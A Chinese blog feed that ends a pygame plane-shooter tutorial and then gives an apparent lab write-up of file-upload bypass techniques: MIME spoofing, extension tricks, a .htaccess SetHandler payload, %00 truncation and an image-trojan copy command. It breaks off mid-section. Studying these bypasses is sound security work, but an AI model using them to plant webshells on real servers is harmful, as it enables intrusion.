2.将敌机精灵添加到精灵组</span>                self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">.</span>add<span class="token punctuation">(</span>enemy<span class="token punctuation">)</span>            <span class="token keyword">elif</span> event<span class="token punctuation">.</span>type <span class="token operator">==</span> HERO_FIRE_EVENT<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>fire<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 使用键盘提供的方法获取键盘按键</span>        keys_pressed <span class="token operator">=</span> pygame<span class="token punctuation">.</span>key<span class="token punctuation">.</span>get_pressed<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 判断元组中对应的按键索引值 1</span>        <span class="token keyword">if</span> keys_pressed<span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token number">3</span>        <span class="token keyword">elif</span> keys_pressed<span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">__check_collide</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.子弹摧毁敌机，子弹和敌机都销毁</span>        pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>groupcollide<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>bullets<span class="token punctuation">,</span> self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.敌机摧毁英雄</span>        enemies <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>spritecollide<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hero<span class="token punctuation">,</span> self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 3.判断列表是否有内容，有内容英雄飞机摧毁</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>enemies<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 让英雄牺牲</span>            self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 结束游戏</span>            PlaneGame<span class="token punctuation">.</span>__game_over<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__update_sprites</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 背景精灵组更新</span>        self<span class="token punctuation">.</span>back_ground<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>back_ground<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>self<span class="token punctuation">.</span>screen<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 敌机精灵组更新</span>        self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>self<span class="token punctuation">.</span>screen<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 英雄精灵组更新</span>        self<span class="token punctuation">.</span>hero_group<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hero_group<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>self<span class="token punctuation">.</span>screen<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 子弹精灵组更新</span>        self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>bullets<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>bullets<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>self<span class="token punctuation">.</span>screen<span class="token punctuation">)</span>    @staticmethod    <span class="token keyword">def</span> <span class="token function">__game_over</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"游戏结束..."</span><span class="token punctuation">)</span>        pygame<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 创建游戏对象</span>    game <span class="token operator">=</span> PlaneGame<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 启动游戏</span>    game<span class="token punctuation">.</span>start_game<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="文件命名为plane-sprites-py"><a href="#文件命名为plane-sprites-py" class="headerlink" title="文件命名为plane_sprites.py"></a>文件命名为plane_sprites.py</h4><pre class=" language-python"><code class="language-python"> <span class="token keyword">import</span> pygame<span class="token keyword">import</span> random<span class="token comment" spellcheck="true"># 定义屏幕大小的常量</span>SCREEN_RECT <span class="token operator">=</span> pygame<span class="token punctuation">.</span>Rect<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">480</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 刷新的帧率，画面多少毫秒刷新一次</span>FRAME_PER_SEC <span class="token operator">=</span> <span class="token number">60</span><span class="token comment" spellcheck="true"># 创建敌机的定时器常量</span>CREATE_ENEMY_EVENT <span class="token operator">=</span> pygame<span class="token punctuation">.</span>USEREVENT<span class="token comment" spellcheck="true"># 英雄发射子弹事件定时器常量</span>HERO_FIRE_EVENT <span class="token operator">=</span> pygame<span class="token punctuation">.</span>USEREVENT <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">class</span> <span class="token class-name">GameSprite</span><span class="token punctuation">(</span>pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Sprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""飞机大战游戏精灵"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> image_name<span class="token punctuation">,</span> speed<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 调用父类的初始化方法</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 定义对象的属性,图像、位置、速度</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span>image_name<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>rect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> speed    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 在屏幕的垂直方向上移动</span>        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">+=</span> self<span class="token punctuation">.</span>speed<span class="token keyword">class</span> <span class="token class-name">Background</span><span class="token punctuation">(</span>GameSprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""游戏背景精灵"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> is_alt<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1. 调用父类方法实现精灵的创建</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"./images/background.png"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2. 判断是否是交替图像，如果是，需要设置初始位置</span>        <span class="token keyword">if</span> is_alt<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>height    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.调用父类的方法实现垂直移动</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.判断是否移除屏幕，如果移除了，再将图片设置到屏幕的上方</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">>=</span> SCREEN_RECT<span class="token punctuation">.</span>height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>height<span class="token keyword">class</span> <span class="token class-name">Enemy</span><span class="token punctuation">(</span>GameSprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""敌机精灵"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.调用父类方法，创建敌机精灵，同时制定敌机图片</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"./images/enemy1.png"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.制定敌机的初始随机速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 3.制定敌机的初始随机位置</span>        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>bottom <span class="token operator">=</span> <span class="token number">0</span>        max_x <span class="token operator">=</span> SCREEN_RECT<span class="token punctuation">.</span>width <span class="token operator">-</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>width        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>x <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> max_x<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.调用父类方法，保持垂直方向的飞行</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.判断是否飞出屏幕，如果是，需要从精灵组删除敌机</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">>=</span> SCREEN_RECT<span class="token punctuation">.</span>height<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"飞出屏幕，需要从精灵组删除..."</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># kill方法可以将精灵从所有精灵组中移除，精灵组就会被自动销毁</span>            self<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"敌机挂了... %s"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span>GameSprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""英雄精灵"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.调用父类方法，设置image &amp; speed</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"./images/me1.png"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.设置英雄的初始位置</span>        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>centerx <span class="token operator">=</span> SCREEN_RECT<span class="token punctuation">.</span>centerx        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>bottom <span class="token operator">=</span> SCREEN_RECT<span class="token punctuation">.</span>bottom <span class="token operator">-</span> <span class="token number">120</span>        <span class="token comment" spellcheck="true"># 3.创建子弹的精灵组</span>        self<span class="token punctuation">.</span>bullets <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Group<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 英雄在水平方向上移动</span>        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>x <span class="token operator">+=</span> self<span class="token punctuation">.</span>speed        <span class="token comment" spellcheck="true"># 控制英雄的位置</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>x <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>right <span class="token operator">></span> SCREEN_RECT<span class="token punctuation">.</span>right<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>right <span class="token operator">=</span> SCREEN_RECT<span class="token punctuation">.</span>right    <span class="token keyword">def</span> <span class="token function">fire</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"发射子弹..."</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 1.创建子弹精灵</span>            bullet <span class="token operator">=</span> Bullet<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 2.设置精灵的位置</span>            bullet<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>bottom <span class="token operator">=</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">-</span> i <span class="token operator">*</span> <span class="token number">20</span>            bullet<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>centerx <span class="token operator">=</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>centerx            <span class="token comment" spellcheck="true"># 3.将精灵添加到精灵组</span>            self<span class="token punctuation">.</span>bullets<span class="token punctuation">.</span>add<span class="token punctuation">(</span>bullet<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Bullet</span><span class="token punctuation">(</span>GameSprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""子弹精灵"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 调用父类方法，设置子弹图片，设置初始速度</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"./images/bullet1.png"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 调用父类方法，让子弹沿垂直方向飞行</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 判断子弹是否飞出屏幕</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>bottom <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"子弹被销毁了..."</span><span class="token punctuation">)</span></code></pre><h4 id="游戏源码及图片下载地址链接：https-pan-baidu-com-s-1oQwSl9HuOve6WBbEae0KUw"><a href="#游戏源码及图片下载地址链接：https-pan-baidu-com-s-1oQwSl9HuOve6WBbEae0KUw" class="headerlink" title="游戏源码及图片下载地址链接：https://pan.baidu.com/s/1oQwSl9HuOve6WBbEae0KUw"></a>游戏源码及图片下载地址链接：<a href="https://pan.baidu.com/s/1oQwSl9HuOve6WBbEae0KUw" target="_blank" rel="noopener">https://pan.baidu.com/s/1oQwSl9HuOve6WBbEae0KUw</a></h4><h4 id="提取码：meje"><a href="#提取码：meje" class="headerlink" title="提取码：meje"></a>提取码：meje</h4><h4 id="游戏效果图"><a href="#游戏效果图" class="headerlink" title="游戏效果图"></a>游戏效果图</h4><p><img src="https://Lmg66.github.io/img/71.png" alt="图片"></p><h4 id="结束乖乖学爬虫和脚本去了-发抖-发抖-发抖"><a href="#结束乖乖学爬虫和脚本去了-发抖-发抖-发抖" class="headerlink" title="结束乖乖学爬虫和脚本去了/发抖/发抖/发抖"></a>结束乖乖学爬虫和脚本去了/发抖/发抖/发抖</h4>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python小游戏(打飞机) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞及绕过</title>
      <link href="/posts/4f5f.html"/>
      <url>/posts/4f5f.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件上传的目的：上传代码文件让服务器执行-个人理解-。"><a href="#文件上传的目的：上传代码文件让服务器执行-个人理解-。" class="headerlink" title="文件上传的目的：上传代码文件让服务器执行(个人理解)。"></a>文件上传的目的：上传代码文件让服务器执行(个人理解)。</h3><h3 id="文件上传的绕过脑图"><a href="#文件上传的绕过脑图" class="headerlink" title="文件上传的绕过脑图"></a>文件上传的绕过脑图</h3><p><img src="https://Lmg66.github.io/img/3.png" alt="图片"></p><h3 id="一-js本地验证绕过"><a href="#一-js本地验证绕过" class="headerlink" title="一.js本地验证绕过"></a>一.js本地验证绕过</h3><p>原理:本地的js,F12查看源代码发现是本地的验证</p><p><img src="https://Lmg66.github.io/img/4.png" alt="图片"></p><p>绕过姿势<br>1.因为属于本地的代码可以尝试修改,然后选择php文件发现上传成功。</p><p><img src="https://Lmg66.github.io/img/5.png" alt="图片"></p><p>2.采用burpsuite,先将文件的名称修改为jpg或png或gif,然后上传，burpsuite拦截将文件类型修改如图,发现能够上传成功<br>。</p><p><img src="https://Lmg66.github.io/img/6.png" alt="图片"></p><h3 id="二-MIME验证绕过-Content-Type"><a href="#二-MIME验证绕过-Content-Type" class="headerlink" title="二.MIME验证绕过(Content-Type)"></a>二.MIME验证绕过(Content-Type)</h3><p>原理:Content-Type（MediaType），即是Internet Media Type，互联网媒体类型，也叫做MIME类型。在互联网中有成百上千中不同的数据类型，HTTP在传输数据对象时会为他们打上称为MIME的数据格式标签，用于区分数据类型。最初MIME是用于电子邮件系统的，后来HTTP也采用了这一方案。在HTTP协议消息头中，使用Content-Type来表示请求和响应中的媒体类型信息。它用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析并展示html等等。<br>使用burpsuite拦截分别为jpg和php类型观察Content-Type发现Content-Type不同.</p><p><img src="https://Lmg66.github.io/img/7.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/8.png" alt="图片"></p><p>拓展:</p><p><img src="https://Lmg66.github.io/img/9.png" alt="图片"></p><p>破解方法:<br>在burpsuite中更改Content-Type进行绕过即可</p><p><img src="https://Lmg66.github.io/img/10.png" alt="图片"></p><h3 id="三-黑名单绕过"><a href="#三-黑名单绕过" class="headerlink" title="三.黑名单绕过"></a>三.黑名单绕过</h3><p>原理:查看网站源代码发现过滤了asp,aspx,php,jsp,但其他的文件后缀可以上传，如phtml，phps，php5，pht</p><p><img src="https://Lmg66.github.io/img/11.png" alt="图片"></p><p>绕过姿势:将文件后缀名改为php5，phtml等,发现能够上传成功，此次没用过滤htaccess文件可以尝试上传。</p><p>拓展:此破解方案需要Apache的httpd.conf有如下配置<br>AddType application/x-httpd-php .php .phtml .phps .php5 .pht<br>关于AddType指令<br>作用:在给定的文件拓展名与特定的内容类型之间建立映射(简单来说就是让phtml，phps，php5，pht等文件后缀的安装php代码来执行，个人理解)</p><p>语法：AddType MIME-type extension [extension] …<br>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</p><h3 id="四-htaccess绕过"><a href="#四-htaccess绕过" class="headerlink" title="四..htaccess绕过"></a>四..htaccess绕过</h3><p>原理:.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用与此目录及其所有的子目录。<br>简单来说:就是htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置<br>他的功能:网页301重定向，自定义404错误页面，改变文件拓展名(此处所用),允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能iis平台上不存在该文件，改文件默认开启，启用和关闭在httpd.conf文件中配置。<br>破解:构造.htaccess文件，文件内容，如图</p><pre><code>&lt;FilesMatch &quot;2.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p><img src="https://Lmg66.github.io/img/12.png" alt="图片"></p><p>然后上传.htaccess文件和2.jpg的木马发现2.jpg被安装php代码执行然后用蚁剑连接，发现可以连接成功，如图</p><p><img src="https://Lmg66.github.io/img/13.png" alt="图片"></p><p>个人理解:通过对.htaccess的禁止目录列表理解运用给自己加了一个保护自己，防止开启phpstudy，其他人访问。</p><p><img src="https://Lmg66.github.io/img/14.png" alt="图片"></p><h3 id="五-大小写绕过"><a href="#五-大小写绕过" class="headerlink" title="五.大小写绕过"></a>五.大小写绕过</h3><p>原理:查看网站源代码发现没有过滤大小写，而windows对大小写不敏感，linux对大小写敏感</p><p><img src="https://Lmg66.github.io/img/15.png" alt="图片"></p><p>破解:修改文件拓展名称为大写，或者用burpsuiet抓包改为大写，发现上传成功，木马可以连接成功</p><p><img src="https://Lmg66.github.io/img/16.png" alt="图片"></p><h3 id="六-空格绕过"><a href="#六-空格绕过" class="headerlink" title="六.空格绕过"></a>六.空格绕过</h3><p>原理:windows等系统下，文件后缀加空格命名之后是默认自动删除空格。查看网站源代码发现过滤了大小写，没用过滤空格。</p><p><img src="https://Lmg66.github.io/img/17.png" alt="图片"></p><p>绕过姿势:上传php文件用burpsuite抓包，添加一个空发现上传成功。用蚁剑连接发现可以连接成功。如下图</p><p><img src="https://Lmg66.github.io/img/18.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/19.png" alt="图片"></p><h3 id="七-点的绕过"><a href="#七-点的绕过" class="headerlink" title="七.点的绕过"></a>七.点的绕过</h3><p>原理:同空格绕过原理一样，主要原因是windows等系统默认删除文件后缀的.和空格，查看网站源码发现，没有过滤点。</p><p><img src="https://Lmg66.github.io/img/20.png" alt="图片"></p><p>绕过姿势:上传php代码，burpsuite抓包加一个点，发现上传成功，用蚁剑连接发现连接成功。</p><p><img src="https://Lmg66.github.io/img/21.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/22.png" alt="图片"></p><h3 id="八-DATA绕过-此绕过只适用windows"><a href="#八-DATA绕过-此绕过只适用windows" class="headerlink" title="八.::$DATA绕过(此绕过只适用windows)"></a>八.::$DATA绕过(此绕过只适用windows)</h3><p>原理:php在windows的适合，如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持”::$DATA”之前的文件名，目的就是不检查后最名。查看网站源代码。发现没有过滤::$DATA。</p><p><img src="https://Lmg66.github.io/img/23.png" alt="图片"></p><p>破解:上传php文件，用burpsuite抓吧文件后缀改为php::$DATA，发现上传成功，用蚁剑链接，发现连接成功，同时打开上传文件发现后缀没有::$DATA</p><p><img src="https://Lmg66.github.io/img/24.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/25.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/26.png" alt="图片"></p><h3 id="九-点空格绕过"><a href="#九-点空格绕过" class="headerlink" title="九.点空格绕过"></a>九.点空格绕过</h3><p>原理:查看源码发现，都过滤但是，点和空格只是过滤了1次，所以我们可以尝试构造.php. .这样就只是过滤了文件末尾的点<br>而没有过滤第一个点，文件后缀变成了.php.实现了文件的上传。</p><p><img src="https://Lmg66.github.io/img/27.png" alt="图片"></p><p>绕过姿势:上传php文件，burpsuite抓包改文件后缀名称为.php. .上传，发现上传成功，用蚁剑连接发现上传成功。</p><p><img src="https://Lmg66.github.io/img/28.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/29.png" alt="图片"></p><h3 id="十-双写绕过"><a href="#十-双写绕过" class="headerlink" title="十.双写绕过"></a>十.双写绕过</h3><p>原理:查看源码发现，没有过滤点，空格，大写等，估计这种不是放在windows下的，这里可以用点大写空格:$DATA等绕过，不过这里的目的不是这个，是让学习双写绕过，看源码发现str_ireplace这个函数将php，php5，php4等后缀变成空格，且只执行了一次，所以可以尝试构造文件后缀为pphphp绕过。</p><p><img src="https://Lmg66.github.io/img/30.png" alt="图片"></p><p>绕过姿势:上传文件后缀为pphphp的文件，发现上传成功，然后蚁剑连接就可以了，发现可以连接成功。</p><p><img src="https://Lmg66.github.io/img/31.png" alt="图片"></p><h3 id="十一-00截断"><a href="#十一-00截断" class="headerlink" title="十一.%00截断"></a>十一.%00截断</h3><p>原理:查看源码发现使用了白名单，只允许jpg，png，gif文件的上传，所以前面使用的方法都不适用，然后我们发现路径img_path函数是让文件位置(save_path)加时间随机数(rand)的方法生成文件位置和文件名称,所以这里我们可以尝试在save_path的地方使用%00的方法截断后面的语句，burpsuite抓包发现，是可以更改save_path的，不过此方法有使用的限制。</p><p>使用限制:</p><p>1、php版本小于5.3.4</p><p>2、php.ini的magic_quotes_gpc为OFF状态</p><p><img src="https://Lmg66.github.io/img/32.png" alt="图片"></p><p>(magic_quotes_gpc)函数的的底层实现是类似c语言，所以可以%00截断</p><p><img src="https://Lmg66.github.io/img/33.png" alt="图片"></p><p>绕过姿势：</p><p>(get传输):上传php文件，burpsuite抓包，修改save_path如图所示，发现上传成功，使用蚁剑连接发现连接成功。</p><p><img src="https://Lmg66.github.io/img/34.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/35.png" alt="图片"></p><p>(post传输):post传输和get传输差不多，不过需要转一下码如图，然后发送发现上传成功。</p><p><img src="https://Lmg66.github.io/img/36.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/37.png" alt="图片"></p><h3 id="十二-图片木马"><a href="#十二-图片木马" class="headerlink" title="十二.图片木马"></a>十二.图片木马</h3><p>查看源码：采用白名单限制上传的只能是图片，故考虑图片木马。</p><p><img src="https://Lmg66.github.io/img/38.png" alt="图片"></p><p>图片木马的制作:</p><pre><code>1. windows下cmd命名 Copy 1.jpg/b+shell.php/a shell.jpg2.右键图片选择属性，详细信息，版权处加入木马，如图3.16进制文本编译器</code></pre><p><img src="https://Lmg66.github.io/img/39.png" alt="图片"></p><p>上传图片木马：上传成功后采用文件包含即可</p><p><img src="https://Lmg66.github.io/img/40.png" alt="图片"></p><h3 id="十三-图马-getimagesize"><a href="#十三-图马-getimagesize" class="headerlink" title="十三.图马 getimagesize()"></a>十三.图马 getimagesize()</h3><p>查看源码：</p><p><img src="https://Lmg66.github.io/img/41.png" alt="图片"></p><p>getimagesize()函数：</p><pre><code>     用于取得图像大小，如果指定的图像或其不是有效的图像，getimagesize()将返回false并产生一条E_WARNING级的错误</code></pre><p>Image_type_to_extension()</p><pre><code>     